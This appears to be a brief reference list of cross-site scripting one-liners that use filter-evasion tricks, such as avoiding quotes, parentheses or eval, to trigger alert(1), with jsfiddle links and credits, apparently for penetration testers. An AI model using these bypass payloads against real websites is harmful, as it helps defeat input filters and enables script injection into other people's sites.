# XSS oneliners payloads that rocks your nuts!

This was a list that I use often has a reference tool that I decided to publish. If you want to contribute your welcome, just tweet me at [@dsopas](https://twitter.com/dsopas) or something. Critics are always welcome!

## Without parentheses and quotes
```javascript
self[0X10f8809.toString`36`]`1`
```

Online: [https://jsfiddle.net/hx7kypv6/]() by [@aemkei](https://twitter.com/aemkei)

## Without quotes or backticks

```javascript
Object.bind(null,alert)()(1)
```

Online: [https://jsfiddle.net/w99tv481/]() by [@garethheyes](https://twitter.com/garethheyes)

## Eval without eval() and without quotes

```javascript
atob.constructor`alert\`1\````
```

Online: [https://jsfiddle.net/r4tdhs1L/]() by [@aemkei](https://twitter.com/aemkei)

## Other evading payloads

```javascript
Function('x=alert`1`','y')()
```

Online: [https://jsfiddle.net/qawpegx9/]() by [@garethheyes](https://twitter.com/garethheyes)